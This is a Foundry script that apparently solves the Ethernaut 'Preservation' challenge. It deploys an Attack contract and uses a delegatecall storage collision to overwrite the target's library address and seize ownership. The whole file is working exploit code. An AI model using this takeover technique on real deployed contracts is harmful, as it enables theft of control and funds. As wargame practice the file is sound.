// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "src/Preservation.sol";

contract Solve is Script {
    Preservation target = Preservation(0x528fa41E0BCdDd7A563791C035a2BDfaE9d6CA9F);
    Attack attack;

    function run() external {
        vm.startBroadcast();
        attack = new Attack();
        vm.stopBroadcast();

        uint256 addrAsUint = uint256(uint160(address(attack)));   

        vm.startBroadcast();
        target.setFirstTime(addrAsUint);
        target.setFirstTime(0);
        vm.stopBroadcast();
        
        console.log(target.owner());
    }
}

contract Attack {
    uint256 storedTime;
    uint256 storedTime2;
    address public owner;

    function setTime(uint256 _time) public {
        storedTime = _time;
        storedTime2 = _time;
        owner = tx.origin;
    }
}
